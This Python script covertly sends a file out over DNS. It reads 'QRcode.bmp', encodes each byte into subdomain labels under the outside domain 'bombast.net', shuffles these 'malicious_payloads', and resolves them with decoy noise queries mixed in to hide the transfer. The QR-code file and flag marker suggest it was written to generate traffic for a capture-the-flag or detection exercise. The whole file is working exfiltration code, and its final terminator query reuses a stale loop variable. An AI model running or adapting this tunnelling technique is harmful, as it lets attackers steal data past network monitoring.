import socket
import random
import os, binascii
import time
MAX_NOISE_COUNT = 3
DOMAIN = "bombast.net"
FLAG = 'a'



def main():
    f = open('QRcode.bmp', 'r')
    payload = f.read();
    f.close();

    message = '\S' + payload + '\E'
    message = message.encode()
    print(message)
    malicious_payloads = []
    for i, b in enumerate(message):
        malicious = "{:04x}".format(i) + 'S' + get_rand_nibble() + FLAG + format(b, 'x') + get_rand_nibble() + '.' + DOMAIN
        malicious_payloads.append(malicious)
    random.shuffle(malicious_payloads)
   # Loop through and send message
    for malicious in malicious_payloads:

        # inject 1 to X amounts of noise into the pipe
        for i in range(random.randint(1, MAX_NOISE_COUNT)):
            req = get_noise() + '.' + DOMAIN
#            print(req)
            socket.gethostbyname(req)
  #          time.sleep(1)
        # inject our payload
 #       print(malicious)
        socket.gethostbyname(malicious)
 #       time.sleep(1)
        # inject 0 to X amounts of noise into the pipe
        for i in range(random.randint(0, MAX_NOISE_COUNT)):
            req = get_noise() + '.' + DOMAIN
  #          print(req)
            socket.gethostbyname(req)
#            time.sleep(1)

    malicious = 'ffffS' + get_rand_nibble() + FLAG + format(b, 'x') + get_rand_nibble() + '.' + DOMAIN
    socket.gethostbyname(malicious)

def get_noise():
    noise = ''.join(random.choice('0123456789abcdef') for n in range(1)) #a included
    noise = noise + ''.join(random.choice('0123456789bcdef') for n in range(1)) #a excluded
    noise = noise + ''.join(random.choice('0123456789abcdef') for n in range(5)) #a included
    return noise

def get_rand_nibble():
    return binascii.b2a_hex(os.urandom(1)).decode()[0]

def get_rand_byte():
    return binascii.b2a_hex(os.urandom(1)).decode()



# run the program
main()
